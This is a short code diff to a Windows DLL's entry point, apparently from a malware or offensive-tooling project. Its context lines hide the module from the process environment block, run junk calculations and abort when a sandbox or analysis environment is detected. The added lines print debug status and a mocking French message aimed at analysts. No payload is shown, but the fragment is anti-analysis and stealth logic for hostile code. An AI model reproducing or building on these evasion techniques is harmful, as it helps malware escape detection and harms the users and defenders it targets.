@@ -11,11 +11,13 @@ extern "C" void __scrt_common_main_seh() {
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
+        printf("[+] DLL_PROCESS_ATTACH - PID: %d\n", GetCurrentProcessId());
         hide_module(hModule);
-        
+        printf("[+] Module hidden from PEB\n");
         execute_junk_calculations();
         
         if (!is_safe_environment()) {
+            printf("[-] UNSAFE ENVIRONMENT - No! :3 Je suis parti avant même que vous ne le sachiez, bande d'idiots ! \n");
             return FALSE;
         }
         
